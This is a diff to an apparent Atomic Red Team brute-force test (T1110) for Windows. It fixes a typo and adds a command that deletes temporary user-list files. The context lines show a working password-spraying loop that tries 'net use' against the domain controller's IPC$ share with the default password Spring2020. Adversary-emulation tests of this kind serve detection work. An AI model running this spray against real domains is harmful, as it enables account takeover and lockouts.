@@ -12,7 +12,7 @@ atomic_tests:
     - windows
   input_arguments:
     password:
-      description: Password to attempt for each users
+      description: Password to attempt for each user
       type: String
       default: Spring2020
 
@@ -22,3 +22,5 @@ atomic_tests:
     command: |
       PathToAtomicsFolder\T1110\src\create_user_list.bat
       @FOR /F %n in (%temp%\users.txt) do @echo . & @net use %logonserver%\IPC$ /user:%userdomain%\%n "#{password}" 1>NUL 2>&1 && @echo [*] %n && @net use /delete %logonserver%\IPC$ > NUL
+    cleanup_command:
+      del %temp%\1.txt >nul 2>&1 & del %temp%\2.txt >nul 2>&1 & del %temp%\3.txt >nul 2>&1 & del %temp%\users.txt >nul 2>&1
